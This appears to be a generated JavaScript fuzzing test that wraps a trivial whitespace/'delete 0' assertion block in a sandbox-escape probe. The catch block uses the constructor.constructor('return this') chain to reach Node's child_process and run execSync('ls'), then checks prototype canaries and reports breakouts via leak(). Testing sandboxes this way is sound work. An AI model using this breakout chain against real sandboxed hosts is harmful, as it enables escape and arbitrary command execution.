try {
    var result;
    result = delete 0;
    assert.sameValue(result, true, '\\u0009');
    result = delete 0;
    assert.sameValue(result, true, '\\u000B');
    result = delete 0;
    assert.sameValue(result, true, '\\u000C');
    result = delete 0;
    assert.sameValue(result, true, '\\u0020');
    result = delete 0;
    assert.sameValue(result, true, '\\u00A0');
    result = delete 0;
    assert.sameValue(result, true, '\\u000A');
    result = delete 0;
    assert.sameValue(result, true, '\\u000D');
    result = delete 0;
    assert.sameValue(result, true, '\\u2028');
    result = delete 0;
    assert.sameValue(result, true, '\\u2029');
    result = delete 0;
    assert.sameValue(result, true, '\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u2029');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}